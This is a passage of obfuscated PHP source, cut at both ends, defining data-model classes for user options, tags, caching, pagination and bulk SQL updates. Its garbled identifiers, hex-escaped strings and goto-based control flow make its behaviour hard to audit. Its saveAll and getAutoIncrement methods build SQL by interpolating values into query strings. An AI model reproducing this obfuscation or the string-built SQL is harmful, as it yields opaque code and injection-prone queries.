$a‰”µÅƒ†–[$C¯Øï†¨®Š[28]][] = array($C¯Øï†¨®Š[511], $C¯Øï†¨®Š[1774] . trim($Fç­˜ÁÆÍà) . $C¯Øï†¨®Š[1774]); } } } return $a‰”µÅƒ†–; goto bõÛ» ƒÁ®; cÊ‹ºËì£ğ: $C¯Øï†¨®Š =& $_SERVER[Ç³Íß¦Ó]; $a‰”µÅƒ†– = array(); if (isset($e­ÆŒó¤®¼[$C¯Øï†¨®Š[722]]) && $e­ÆŒó¤®¼[$C¯Øï†¨®Š[722]]) { $a‰”µÅƒ†–[$C¯Øï†¨®Š[84]] = array($C¯Øï†¨®Š[1944], $e­ÆŒó¤®¼[$C¯Øï†¨®Š[722]]); } goto B‹‘°õãÙğ; bõÛ» ƒÁ®: } } goto cô”íç’è; a¨Éæâ¤¬·: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\157\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($c¿‘´´ß–œ) { $aª’•ÈÒìÉ =& $_SERVER[Ç³Íß¦Ó]; if (!defined($aª’•ÈÒìÉ[452])) { define($aª’•ÈÒìÉ[452], 0); } return "\x55\163\145\162\x4f\160\164\x69\x6f\156\x5f{$c¿‘´´ß–œ}\x5f" . USER_ID; } protected function filterWhere($BÍ£ÌË‹İá) { $FÁ†’„¯î =& $_SERVER[Ç³Íß¦Ó]; if (!defined($FÁ†’„¯î[452])) { define($FÁ†’„¯î[452], 0); } $BÍ£ÌË‹İá[$FÁ†’„¯î[1526]] = USER_ID; return $BÍ£ÌË‹İá; } public function cacheRemoveUser($cƒ‰‰ÆŒÓ¨, $d»©ñë¾®£) { return Cache::remove("\x55\x73\x65\162\117\160\164\x69\x6f\156\x5f{$cƒ‰‰ÆŒÓ¨}\x5f" . $d»©ñë¾®£); } protected function optionDefault($B‘×¥œö‡ = '') { $eÑÛ†íæ“Ç =& $_SERVER[Ç³Íß¦Ó]; if ($B‘×¥œö‡ == $eÑÛ†íæ“Ç[33]) { return $GLOBALS[$eÑÛ†íæ“Ç[6]][$eÑÛ†íæ“Ç[2157]]; } if ($B‘×¥œö‡ == $eÑÛ†íæ“Ç[2158]) { return $GLOBALS[$eÑÛ†íæ“Ç[6]][$eÑÛ†íæ“Ç[2159]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\56\x74\x61\147\114\x69\163\164"; public $modelType = "\125\x73\x65\162\117\160\164\151\x6f\156"; public $field = array("\156\141\155\145", "\163\164\x79\154\145", "\x73\x6f\x72\x74"); public function listData($D†ˆÖÏ² = false, $cºš¦Š¾öİ = "\163\157\x72\164", $AšôŞ¢—…ë = false) { return parent::listData($D†ˆÖÏ², $cºš¦Š¾öİ, $AšôŞ¢—…ë); } public function remove($FÒËÍ¾‡¥ê) { return parent::remove($FÒËÍ¾‡¥ê); } public function add($F«…åŒ×ÔŒ, $Bƒèö…Ó­ = "\x6c\x61\142\x65\154\55\147\162\x65\x79\55\156\157\162\x6d\141\x6c") { $Aáøá•¦±á =& $_SERVER[Ç³Íß¦Ó]; if ($this->findByName($F«…åŒ×ÔŒ)) { return !1; } $d‡†›»ùÁ = array($Aáøá•¦±á[411] => $F«…åŒ×ÔŒ, $Aáøá•¦±á[462] => $Bƒèö…Ó­, $Aáøá•¦±á[1693] => $this->getSort($Aáøá•¦±á[255]) + 1); return parent::insert($d‡†›»ùÁ); } public function update($aÆÒ‡•åŸ¢, $bÂÃø’‰Ó) { $cÅãÎ¬ò» =& $_SERVER[Ç³Íß¦Ó]; $d®»áÁ“ò© = $this->listData($aÆÒ‡•åŸ¢); $Aİº­‡ŠÚ¯ = $this->findByName($bÂÃø’‰Ó[$cÅãÎ¬ò»[28]]); if (!$d®»áÁ“ò© || $Aİº­‡ŠÚ¯ && $Aİº­‡ŠÚ¯[$cÅãÎ¬ò»[392]] != $d®»áÁ“ò©[$cÅãÎ¬ò»[392]]) { return !1; } return parent::update($aÆÒ‡•åŸ¢, $bÂÃø’‰Ó); } public function moveTop($B‡êğœå) { $C¨â™óíï =& $_SERVER[Ç³Íß¦Ó]; $Aìã–Û¢ó = parent::listData(); $B½½ˆî‡ù… = $this->getSort($C¨â™óíï[254]); foreach ($Aìã–Û¢ó as &$eÍ¬¿ƒ¯Š±) { if ($eÍ¬¿ƒ¯Š±[$C¨â™óíï[392]] == $B‡êğœå) { $eÍ¬¿ƒ¯Š±[$C¨â™óíï[1712]] = $B½½ˆî‡ù…; continue; } $eÍ¬¿ƒ¯Š±[$C¨â™óíï[1712]] += 1; } unset($eÍ¬¿ƒ¯Š±); return parent::resetData($Aìã–Û¢ó); } public function moveBottom($a‘ˆ³ÆÇ¼æ) { $fÍá”äÍÒæ =& $_SERVER[Ç³Íß¦Ó]; $A¦„§´¡¨ = $this->getSort($fÍá”äÍÒæ[255]) + 1; return parent::update($a‘ˆ³ÆÇ¼æ, array($fÍá”äÍÒæ[1712] => $A¦„§´¡¨)); } public function resetSort($a‘ƒ±©òÕ) { goto EÊ¶®Êğœç; A»‚×í¨Êí: unset($e¯ßÒ°‚âÀ); return parent::resetData($C¡°ïï§õ‹); goto aŒ‹˜˜±Ÿ¾; EÊ¶®Êğœç: $bİêĞ¾ã«Ë =& $_SERVER[Ç³Íß¦Ó]; $eÇÅ¨êÃÕ = array(); $a‘ƒ±©òÕ = is_array($a‘ƒ±©òÕ) ? $a‘ƒ±©òÕ : array(); goto D›‚ ÷Ú; D›‚ ÷Ú: for ($C´‚åÓùå = 0; $C´‚åÓùå < count($a‘ƒ±©òÕ); $C´‚åÓùå++) { $eÇÅ¨êÃÕ[$a‘ƒ±©òÕ[$C´‚åÓùå] . $bİêĞ¾ã«Ë[33]] = $C´‚åÓùå + 1; } $C¡°ïï§õ‹ = parent::listData(); foreach ($C¡°ïï§õ‹ as &$e¯ßÒ°‚âÀ) { $bë‰†«¶’º = $eÇÅ¨êÃÕ[$e¯ßÒ°‚âÀ[$bİêĞ¾ã«Ë[392]]]; $e¯ßÒ°‚âÀ[$bİêĞ¾ã«Ë[1712]] = $bë‰†«¶’º ? $bë‰†«¶’º : $e¯ßÒ°‚âÀ[$bİêĞ¾ã«Ë[1712]]; } goto A»‚×í¨Êí; aŒ‹˜˜±Ÿ¾: } private function getSort($DÇºØŠİ†) { $d×Œ¯œµ’Ô =& $_SERVER[Ç³Íß¦Ó]; $C•ŒòÌÌ¬¡ = parent::listData(); $fÜ ¿çñã = array_to_keyvalue($C•ŒòÌÌ¬¡, $d×Œ¯œµ’Ô[33], $d×Œ¯œµ’Ô[1712]); if (!$fÜ ¿çñã) { $fÜ ¿çñã = array(0); } $e†À“ “ = $DÇºØŠİ† == $d×Œ¯œµ’Ô[255] ? max($fÜ ¿çñã) : min($fÜ ¿çñã); return intval($e†À“ “); } } goto c§à‘‘‚”à; a¬÷à™Š›‰: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\164\54\165\160\x64\141\x74\145", "\x66\165\156\143\164\151\157\156"), array("\143\162\x65\x61\x74\x65\x54\x69\155\x65", "\164\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\x66\165\x6e\x63\x74\151\x6f\156")); public function setDataAuto($AäÃÒêñ‚‡) { $this->dataAuto = $AäÃÒêñ‚‡; } public function __construct($CŒäÏ…´ŠÇ = '', $dÙÔ£ÙË¼¿ = '', $f²«ô‘Çì = '') { parent::__construct($CŒäÏ…´ŠÇ, $dÙÔ£ÙË¼¿, $f²«ô‘Çì); } public static function textEncode($bŒÚÚ) { if (!$bŒÚÚ) { return $bŒÚÚ; } $Dò‹Ö‚š = json_encode($bŒÚÚ); $Dò‹Ö‚š = preg_replace_callback($_SERVER[Ç³Íß¦Ó][352], function ($aòÑ¾ÔƒñÉ) { return addslashes($aòÑ¾ÔƒñÉ[0]); }, $Dò‹Ö‚š); return json_decode($Dò‹Ö‚š); } public static function textDecode($c”õ¥ƒĞÆ») { $câêÜ©ö =& $_SERVER[Ç³Íß¦Ó]; $EŠÓê©Šù = json_encode($c”õ¥ƒĞÆ»); $EŠÓê©Šù = preg_replace_callback($câêÜ©ö[353], function ($fí†Êã§) { return $_SERVER[Ç³Íß¦Ó][97]; }, $EŠÓê©Šù); return json_decode($EŠÓê©Šù); } protected $tableMeta = array(); protected function _beforeInsert(&$c»ö˜Ñ¡Ú°, $Eİùºƒó) { $d ï¿‚•± =& $_SERVER[Ç³Íß¦Ó]; if (!$this->checkDataAutoHas($d ï¿‚•±[354])) { return; } $this->dataBeforeFilter($c»ö˜Ñ¡Ú°, $d ï¿‚•±[354]); } protected function _beforeUpdate(&$aãä¸›“Â´, $c¨¦†ÉÆ) { $F³§Ò—Í‡ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->checkDataAutoHas($F³§Ò—Í‡[355])) { return; } $this->dataBeforeFilter($aãä¸›“Â´, $F³§Ò—Í‡[355]); } protected function _afterSelect(&$Bñè¾çù›ê, $F¬‡£Œø˜¸) { if (!is_array($Bñè¾çù›ê)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ç³Íß¦Ó][356])) { return; } foreach ($Bñè¾çù›ê as &$f«ÔğùØ³) { $this->dataAfterFilter($f«ÔğùØ³); } unset($f«ÔğùØ³); } protected function _afterFind(&$cê¾ßÇà‡”, $D„˜İçèŸŒ) { if (!is_array($cê¾ßÇà‡”)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ç³Íß¦Ó][356])) { return; } $this->dataAfterFilter($cê¾ßÇà‡”); } public function setAutoIncrement($fæ“‹‡ÒóÖ) { $FÆ¼’ãšîÙ = array($this->getPk() => $fæ“‹‡ÒóÖ); $CÂ§¯©Í‘ä = $this->data($FÆ¼’ãšîÙ)->add(); if ($CÂ§¯©Í‘ä) { $this->delete($CÂ§¯©Í‘ä); } } public function getAutoIncrement() { $c ñƒ§®í· = $this->getTableName(); $F–÷Àæñ¾¬ = $this->max($this->getPk()); $f¤©øš§® = $this->query("\x73\150\x6f\167\40\164\141\x62\154\x65\x20\x73\x74\x61\x74\x75\x73\x20\x77\150\x65\162\x65\40\x4e\x61\x6d\145\x3d\x27{$c ñƒ§®í·}\x27"); $b°ÂƒµìİÌ = $f¤©øš§®[0][$_SERVER[Ç³Íß¦Ó][357]]; $Aó¸‰ŠéÅ¡ = max($F–÷Àæñ¾¬, $b°ÂƒµìİÌ); return $Aó¸‰ŠéÅ¡; } protected function _callBefore($eñÃ² ±ÕÚ, $a®ãğ…ï¶ì) { return $this->cacheCallCheck($eñÃ² ±ÕÚ, $a®ãğ…ï¶ì, !1); } protected function _callAfter($A®õöä³Ä, $bì¬¶¨‰Œ¿) { return $this->cacheCallCheck($A®õöä³Ä, $bì¬¶¨‰Œ¿, !0); } protected function cacheFunctionAlias($a ­À¯à¬Õ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($fù¿·òØ¦, $cºğø†ŒÒ, $d˜©ÎåÎÚ‰ = false) { $bÉèšÊ›İ = $this->cacheFunctionAlias($cºğø†ŒÒ); if (!$bÉèšÊ›İ) { return; } foreach ($bÉèšÊ›İ as $b…¥ñÊ¿‰„ => $F§ãŞî£®¢) { $aŠÉî’¹¥– = $F§ãŞî£®¢[0]; $e‡ˆ‡ø‡© = explode($_SERVER[Ç³Íß¦Ó][47], $F§ãŞî£®¢[1]); if ($fù¿·òØ¦ == $b…¥ñÊ¿‰„) { return $this->cacheFunctionGet($b…¥ñÊ¿‰„, $aŠÉî’¹¥–); } if ($d˜©ÎåÎÚ‰ && in_array($fù¿·òØ¦, $e‡ˆ‡ø‡©)) { $this->cacheFunctionClear($b…¥ñÊ¿‰„, $aŠÉî’¹¥–); } } } public function cacheFunctionGet($CáÍ´Ô‹’Ô, $BÉô¸„íœô) { $E×µ´§ËÉª = $this->cacheKeyMake($CáÍ´Ô‹’Ô, $BÉô¸„íœô); $E˜ĞéêãÕ± = Cache::get($E×µ´§ËÉª); if (!is_array($E˜ĞéêãÕ±)) { $E˜ĞéêãÕ± = call_user_func_array(array($this, $CáÍ´Ô‹’Ô), array($BÉô¸„íœô, !0)); Cache::set($E×µ´§ËÉª, $E˜ĞéêãÕ±); } return $E˜ĞéêãÕ±; } public function cacheFunctionClear($AÑ˜Ã„ÛŒ, $AÁ»Õ°èåƒ) { $f—ßÁè¥¢ = $AÁ»Õ°èåƒ; if (!is_array($AÁ»Õ°èåƒ)) { $f—ßÁè¥¢ = array($AÁ»Õ°èåƒ); } foreach ($f—ßÁè¥¢ as $A‚ˆ…°†‰Û) { $FÍÆÆ“Âß = $this->cacheKeyMake($AÑ˜Ã„ÛŒ, $A‚ˆ…°†‰Û); Cache::remove($FÍÆÆ“Âß); } } private function cacheKeyMake($b§äŒÃÅˆ, $a¦µÎÑøÖÔ) { $Eè©‹Áš´ =& $_SERVER[Ç³Íß¦Ó]; return get_class($this) . $Eè©‹Áš´[71] . $b§äŒÃÅˆ . $Eè©‹Áš´[358] . $a¦µÎÑøÖÔ; } protected function selectPageReset() { $d¶Èçİ¨“œ =& $_SERVER[Ç³Íß¦Ó]; if (isset($GLOBALS[$d¶Èçİ¨“œ[359]])) { return; } $GLOBALS[$d¶Èçİ¨“œ[359]] = isset($GLOBALS[$d¶Èçİ¨“œ[7]][$d¶Èçİ¨“œ[360]]) ? $GLOBALS[$d¶Èçİ¨“œ[7]][$d¶Èçİ¨“œ[360]] : !1; $GLOBALS[$d¶Èçİ¨“œ[361]] = isset($GLOBALS[$d¶Èçİ¨“œ[7]][$d¶Èçİ¨“œ[350]]) ? $GLOBALS[$d¶Èçİ¨“œ[7]][$d¶Èçİ¨“œ[350]] : !1; $GLOBALS[$d¶Èçİ¨“œ[7]][$d¶Èçİ¨“œ[360]] = !1; $GLOBALS[$d¶Èçİ¨“œ[7]][$d¶Èçİ¨“œ[350]] = !1; } protected function selectPageRestore() { $bØå“¿…‚Ÿ =& $_SERVER[Ç³Íß¦Ó]; if (!isset($GLOBALS[$bØå“¿…‚Ÿ[359]])) { return; } $GLOBALS[$bØå“¿…‚Ÿ[7]][$bØå“¿…‚Ÿ[360]] = $GLOBALS[$bØå“¿…‚Ÿ[359]]; $GLOBALS[$bØå“¿…‚Ÿ[7]][$bØå“¿…‚Ÿ[350]] = $GLOBALS[$bØå“¿…‚Ÿ[361]]; unset($GLOBALS[$bØå“¿…‚Ÿ[359]]); unset($GLOBALS[$bØå“¿…‚Ÿ[361]]); } protected function selectPage($B¥™ÌàÚè = 200, $BäÈ“¿æ¸‰ = 1) { goto C’´¿À‹¤·; BÔ¼àß‡‰­: $B¥™ÌàÚè = $B¥™ÌàÚè <= 5 ? 5 : ($B¥™ÌàÚè >= $E«ë»ªğø¸ ? $E«ë»ªğø¸ : $B¥™ÌàÚè); $BäÈ“¿æ¸‰ = intval(isset($in[$eô»à–ÍŒ–[350]]) && $in[$eô»à–ÍŒ–[350]] ? $in[$eô»à–ÍŒ–[350]] : $BäÈ“¿æ¸‰); $BäÈ“¿æ¸‰ = $BäÈ“¿æ¸‰ <= 1 ? 1 : $BäÈ“¿æ¸‰; goto fÕòª™ğ®½; BÌù™Ìğ¥¥: if (!is_array($b“™…†¨íÜ)) { $b“™…†¨íÜ = array(); } if ($c‡“¬ÓËÇˆ == 1) { $eŸÕ‘à­á„ = count($b“™…†¨íÜ); } $fñÑ«Ìø¹õ = array($eô»à–ÍŒ–[363] => array($eô»à–ÍŒ–[364] => $eŸÕ‘à­á„, $eô»à–ÍŒ–[360] => $B¥™ÌàÚè, $eô»à–ÍŒ–[350] => $BäÈ“¿æ¸‰, $eô»à–ÍŒ–[365] => $c‡“¬ÓËÇˆ), $eô»à–ÍŒ–[366] => $b“™…†¨íÜ); goto B»³Ç†ğŒÛ; C’´¿À‹¤·: $eô»à–ÍŒ– =& $_SERVER[Ç³Íß¦Ó]; global $in; $a™æ‘ğœĞ = $this->optionsValue(); goto dÄ•ÜğĞ; B»³Ç†ğŒÛ: return $fñÑ«Ìø¹õ; goto fˆÚÛ¸‰ˆ; fÕòª™ğ®½: $b“™…†¨íÜ = array(); $F•áÖ‰’Å¾ = 1; if ($BäÈ“¿æ¸‰ == 1 && $F•áÖ‰’Å¾) { $this->optionsValue($a™æ‘ğœĞ); $b“™…†¨íÜ = $this->page($BäÈ“¿æ¸‰, $B¥™ÌàÚè)->select(); $eŸÕ‘à­á„ = is_array($b“™…†¨íÜ) ? count($b“™…†¨íÜ) : 0; if ($eŸÕ‘à­á„ < $B¥™ÌàÚè) { $c‡“¬ÓËÇˆ = 1; } else { $this->optionsValue($eÚÎ ‰º³); $eŸÕ‘à­á„ = intval($this->count()); $c‡“¬ÓËÇˆ = ceil($eŸÕ‘à­á„ / $B¥™ÌàÚè); } } else { $this->optionsValue($eÚÎ ‰º³); $eŸÕ‘à­á„ = intval($this->count()); $c‡“¬ÓËÇˆ = ceil($eŸÕ‘à­á„ / $B¥™ÌàÚè); $BäÈ“¿æ¸‰ = $BäÈ“¿æ¸‰ >= $c‡“¬ÓËÇˆ ? $c‡“¬ÓËÇˆ : $BäÈ“¿æ¸‰; $this->optionsValue($a™æ‘ğœĞ); $b“™…†¨íÜ = $this->page($BäÈ“¿æ¸‰, $B¥™ÌàÚè)->select(); } goto BÌù™Ìğ¥¥; d·„•Óˆ¡²: $eÚÎ ‰º³ = $a™æ‘ğœĞ; $eÚÎ ‰º³[$eô»à–ÍŒ–[362]] = array(); $B¥™ÌàÚè = intval($B¥™ÌàÚè); goto BÔ¼àß‡‰­; dÄ•ÜğĞ: $E«ë»ªğø¸ = 50000; $B¥™ÌàÚè = isset($in[$eô»à–ÍŒ–[360]]) && $in[$eô»à–ÍŒ–[360]] ? $in[$eô»à–ÍŒ–[360]] : $B¥™ÌàÚè; if ($B¥™ÌàÚè === -1) { $in[$eô»à–ÍŒ–[360]] = !1; $E«ë»ªğø¸ = 100000000; $B¥™ÌàÚè = $E«ë»ªğø¸; } goto d·„•Óˆ¡²; fˆÚÛ¸‰ˆ: } protected function checkLength($D£Í¿àÆ®, $aé¹âáÖé“ = 0, $E”Š²ƒ‹³ = '') { $fàçè ˆîò =& $_SERVER[Ç³Íß¦Ó]; $aé¹âáÖé“ = $aé¹âáÖé“ ? $aé¹âáÖé“ : 65536; if (!$D£Í¿àÆ® || strlen($D£Í¿àÆ®) < $aé¹âáÖé“) { return; } $E”Š²ƒ‹³ = $E”Š²ƒ‹³ ? $E”Š²ƒ‹³ . $fàçè ˆîò[68] : $fàçè ˆîò[33]; show_json($E”Š²ƒ‹³ . LNG($fàçè ˆîò[367]) . "\x28{$aé¹âáÖé“}\51", !1); } protected function metaSet($DØ‘××Õì, $eÏ­ÍÜ¯ƒ = null, $a’—Í¸Ä˜å = null) { goto Cõ¬‡†“±”; EîÙŒõğí: CacheLock::unlock($c¹ÚÂ– æ‘); return !0; goto B‚òê–Ó¬Û; A‘Í¿ò¬¿: if (is_null($eÏ­ÍÜ¯ƒ)) { return $Eğ½°Ÿê£»->where(array($DÕ¡™ éó => $DØ‘××Õì))->delete(); } if (is_null($a’—Í¸Ä˜å) && is_string($eÏ­ÍÜ¯ƒ)) { return $Eğ½°Ÿê£»->where($aâ¦Á”˜À)->delete(); } $fôÒ’É§¼Ã = is_array($eÏ­ÍÜ¯ƒ) ? $eÏ­ÍÜ¯ƒ : array(); goto f³‹ÄùĞ³ˆ; aß§óè: $dÒ“Ã—”«ß = $this->tableMeta[$eÏù’Å½Õ[369]]; $Eğ½°Ÿê£» = Model($dÒ“Ã—”«ß); $aâ¦Á”˜À = array($DÕ¡™ éó => $DØ‘××Õì, $eÏù’Å½Õ[370] => $eÏ­ÍÜ¯ƒ); goto A‘Í¿ò¬¿; f³‹ÄùĞ³ˆ: if (is_string($eÏ­ÍÜ¯ƒ)) { $fôÒ’É§¼Ã[$eÏ­ÍÜ¯ƒ] = $a’—Í¸Ä˜å; } $C¼šÒï¬Ç = array(); foreach ($fôÒ’É§¼Ã as $a´áÓÜ­ê => $CÆ«ÜªŸÍ¶) { $this->checkLength($CÆ«ÜªŸÍ¶, !1, $dÒ“Ã—”«ß . $eÏù’Å½Õ[4] . $a´áÓÜ­ê); $C¼šÒï¬Ç[] = array($DÕ¡™ éó => $DØ‘××Õì, $eÏù’Å½Õ[93] => $a´áÓÜ­ê, $eÏù’Å½Õ[371] => $CÆ«ÜªŸÍ¶); } goto cì•³Ü•çë; cì•³Ü•çë: $c¹ÚÂ– æ‘ = $eÏù’Å½Õ[372] . $this->tableMeta; CacheLock::lock($c¹ÚÂ– æ‘); $Eğ½°Ÿê£»->where(array($DÕ¡™ éó => $DØ‘××Õì))->addAll($C¼šÒï¬Ç, array(), !0); goto EîÙŒõğí; Cõ¬‡†“±”: $eÏù’Å½Õ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->tableMeta || !$DØ‘××Õì) { return !1; } $DÕ¡™ éó = $this->tableMeta[$eÏù’Å½Õ[368]]; goto aß§óè; B‚òê–Ó¬Û: } public function metaGet($F†é‘¨¥Ç•, $FÆ‚ˆ†ÖöĞ = false) { goto cÕëğ½ñ½ê; AáŞ‹ ¹ƒ“: $f¥Óù¢¯‘à = $C­ó¢Å¢Â->field($b†ÉÃ¼«äÆ[373])->where($BĞ­Š×ËÒ)->select(); $f¥Óù¢¯‘à = array_to_keyvalue($f¥Óù¢¯‘à, $b†ÉÃ¼«äÆ[93], $b†ÉÃ¼«äÆ[371]); return $f¥Óù¢¯‘à; goto B¾ö‡—ùØ”; Fï§İÅæ¢‘: $C­ó¢Å¢Â = Model($this->tableMeta[$b†ÉÃ¼«äÆ[369]]); if ($FÆ‚ˆ†ÖöĞ) { $BĞ­Š×ËÒ = array($AíÚÈÃÇ¼ù => $F†é‘¨¥Ç•, $b†ÉÃ¼«äÆ[93] => $FÆ‚ˆ†ÖöĞ); return $C­ó¢Å¢Â->where($BĞ­Š×ËÒ)->getField($b†ÉÃ¼«äÆ[371]); } $BĞ­Š×ËÒ = array($AíÚÈÃÇ¼ù => $F†é‘¨¥Ç•); goto AáŞ‹ ¹ƒ“; cÕëğ½ñ½ê: $b†ÉÃ¼«äÆ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->tableMeta) { return array(); } $AíÚÈÃÇ¼ù = $this->tableMeta[$b†ÉÃ¼«äÆ[368]]; goto Fï§İÅæ¢‘; B¾ö‡—ùØ”: } private function checkDataAutoHas($C÷Ï„÷ÊÑÒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $D®šø¯á‚º) { if (in_array($C÷Ï„÷ÊÑÒ, explode($_SERVER[Ç³Íß¦Ó][47], $D®šø¯á‚º[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E÷º¸­„œ, $E…Ç ¿¯Ä¨) { $e…«½ğæÅ =& $_SERVER[Ç³Íß¦Ó]; foreach ($this->dataAuto as $cÚºêÌŠŠ¡) { $D²ÔãÔùìÅ = $cÚºêÌŠŠ¡[0]; if (!in_array($E…Ç ¿¯Ä¨, explode($e…«½ğæÅ[47], $cÚºêÌŠŠ¡[2]))) { continue; } switch (trim($cÚºêÌŠŠ¡[3])) { case $e…«½ğæÅ[318]: case $e…«½ğæÅ[319]: $B–˜®›…¼“ = $cÚºêÌŠŠ¡[1]; $Eåõ”™º›Œ = isset($cÚºêÌŠŠ¡[4]) ? (array) $cÚºêÌŠŠ¡[4] : array(); if ($B–˜®›…¼“ == $e…«½ğæÅ[196] && array_key_exists($D²ÔãÔùìÅ, $E÷º¸­„œ)) { if (!$E÷º¸­„œ[$D²ÔãÔùìÅ]) { unset($E÷º¸­„œ[$D²ÔãÔùìÅ]); } break; } if (isset($E÷º¸­„œ[$D²ÔãÔùìÅ])) { array_unshift($Eåõ”™º›Œ, $E÷º¸­„œ[$D²ÔãÔùìÅ]); } if ($e…«½ğæÅ[318] == $cÚºêÌŠŠ¡[3]) { $E÷º¸­„œ[$D²ÔãÔùìÅ] = call_user_func_array($B–˜®›…¼“, $Eåõ”™º›Œ); } else { $E÷º¸­„œ[$D²ÔãÔùìÅ] = call_user_func_array(array(&$this, $B–˜®›…¼“), $Eåõ”™º›Œ); } break; case $e…«½ğæÅ[270]: $E÷º¸­„œ[$D²ÔãÔùìÅ] = $E÷º¸­„œ[$cÚºêÌŠŠ¡[1]]; break; case $e…«½ğæÅ[291]: if (isset($E÷º¸­„œ[$D²ÔãÔùìÅ]) && !is_string($E÷º¸­„œ[$D²ÔãÔùìÅ])) { $E÷º¸­„œ[$D²ÔãÔùìÅ] = json_encode_force($E÷º¸­„œ[$D²ÔãÔùìÅ]); } break; case $e…«½ğæÅ[320]: if ($E÷º¸­„œ[$D²ÔãÔùìÅ] === $e…«½ğæÅ[33]) { unset($E÷º¸­„œ[$D²ÔãÔùìÅ]); } break; case $e…«½ğæÅ[321]: $E÷º¸­„œ[$D²ÔãÔùìÅ] = $cÚºêÌŠŠ¡[1]; default: break; } } if ($E…Ç ¿¯Ä¨ == $e…«½ğæÅ[354]) { $FÅ›æëÚ† = strtolower($this->db->getDbType()); if (strpos($FÅ›æëÚ†, $e…«½ğæÅ[9]) !== 0) { return; } $bŠ£ÒÖŞÉ­ = $this->field(!0)->fields; $B‘”šç ñŸ = $bŠ£ÒÖŞÉ­[$e…«½ğæÅ[249]]; if (isset($bŠ£ÒÖŞÉ­[$e…«½ğæÅ[248]])) { unset($B‘”šç ñŸ[$bŠ£ÒÖŞÉ­[$e…«½ğæÅ[248]]]); } foreach ($B‘”šç ñŸ as $bĞñ¿Ôóç® => $E…Ç ¿¯Ä¨) { if (!isset($E÷º¸­„œ[$bĞñ¿Ôóç®])) { $E÷º¸­„œ[$bĞñ¿Ôóç®] = $e…«½ğæÅ[33]; } } } } private function dataAfterFilter(&$AÁîøŒªå³) { $eÒ°•µõø =& $_SERVER[Ç³Íß¦Ó]; foreach ($this->dataAuto as $FÀğÏËÄ¦®) { $DïÃÆÌ”è = $FÀğÏËÄ¦®[0]; if (!in_array($eÒ°•µõø[356], explode($eÒ°•µõø[47], $FÀğÏËÄ¦®[2]))) { continue; } if (!isset($AÁîøŒªå³[$DïÃÆÌ”è])) { continue; } switch (trim($FÀğÏËÄ¦®[3])) { case $eÒ°•µõø[318]: case $eÒ°•µõø[319]: $CÔÅ»½•èù = isset($FÀğÏËÄ¦®[4]) ? (array) $FÀğÏËÄ¦®[4] : array(); array_unshift($CÔÅ»½•èù, $AÁîøŒªå³[$DïÃÆÌ”è]); if ($eÒ°•µõø[318] == $FÀğÏËÄ¦®[3]) { $AÁîøŒªå³[$DïÃÆÌ”è] = call_user_func_array($FÀğÏËÄ¦®[1], $CÔÅ»½•èù); } else { $AÁîøŒªå³[$DïÃÆÌ”è] = call_user_func_array(array(&$this, $FÀğÏËÄ¦®[1]), $CÔÅ»½•èù); } break; case $eÒ°•µõø[270]: $AÁîøŒªå³[$DïÃÆÌ”è] = $AÁîøŒªå³[$FÀğÏËÄ¦®[1]]; break; case $eÒ°•µõø[291]: $Dä¬ÓèÌˆ‰ = $AÁîøŒªå³[$DïÃÆÌ”è]; $AÁîøŒªå³[$DïÃÆÌ”è] = json_decode($Dä¬ÓèÌˆ‰, !0); if (is_null($AÁîøŒªå³[$DïÃÆÌ”è])) { $AÁîøŒªå³[$DïÃÆÌ”è] = $Dä¬ÓèÌˆ‰; } break; case $eÒ°•µõø[320]: if ($AÁîøŒªå³[$DïÃÆÌ”è] === $eÒ°•µõø[33]) { unset($AÁîøŒªå³[$DïÃÆÌ”è]); } break; case $eÒ°•µõø[321]: $AÁîøŒªå³[$DïÃÆÌ”è] = $FÀğÏËÄ¦®[1]; default: break; } } } public function saveAll($D„š±Ì‹ñ) { goto f©¶ºĞÙ×Ş; CÌÂ¿ÀÑÆ˜: $D„š±Ì‹ñ = is_array($D„š±Ì‹ñ) ? $D„š±Ì‹ñ : array(); $C½Œ‚î‚Ñ¸ = $C×¶¬¨‡óâ[374]; $fÊÀİ¯áÔƒ = 0; goto BåªæÉÓï; FßçĞÅ·ç¥: $this->chunkEventSet(); goto a”µŠ‹’Á£; f©¶ºĞÙ×Ş: $C×¶¬¨‡óâ =& $_SERVER[Ç³Íß¦Ó]; $f¨¯Å¾ßê© = $this->tablePrefix . $this->tableName; $C¢£‘À¹£ğ = self::SQL_WHERE_IN_CHUNK; goto CÌÂ¿ÀÑÆ˜; BåªæÉÓï: $aÃÔÄÉ’ËÕ = array(); $Aì­‡²©ö = count($D„š±Ì‹ñ); for ($FÍØ«İ®éŞ = 0; $FÍØ«İ®éŞ < $Aì­‡²©ö; $FÍØ«İ®éŞ++) { $A÷ÔÈÏ„íö = $D„š±Ì‹ñ[$FÍØ«İ®éŞ]; if (!is_array($A÷ÔÈÏ„íö) || count($A÷ÔÈÏ„íö) != 4) { continue; } $aˆÎÈËÚö¡ = "\x55\120\104\x41\x54\105\x20\x60{$f¨¯Å¾ßê©}\x60\x20\x53\x45\x54\40{$A÷ÔÈÏ„íö[2]}\40\75\40\x43\x41\x53\105\x20{$A÷ÔÈÏ„íö[0]}\40\12"; if ($fÊÀİ¯áÔƒ == 0) { $C½Œ‚î‚Ñ¸ = $aˆÎÈËÚö¡; } $aÃÔÄÉ’ËÕ[] = $C×¶¬¨‡óâ[116] . $A÷ÔÈÏ„íö[1] . $C×¶¬¨‡óâ[116]; $fÊÀİ¯áÔƒ++; $C½Œ‚î‚Ñ¸ .= "\40\x57\x48\x45\116\40\x27{$A÷ÔÈÏ„íö[1]}\x27\x20\124\110\x45\116\x20\x27{$A÷ÔÈÏ„íö[3]}\47\40\xa"; if 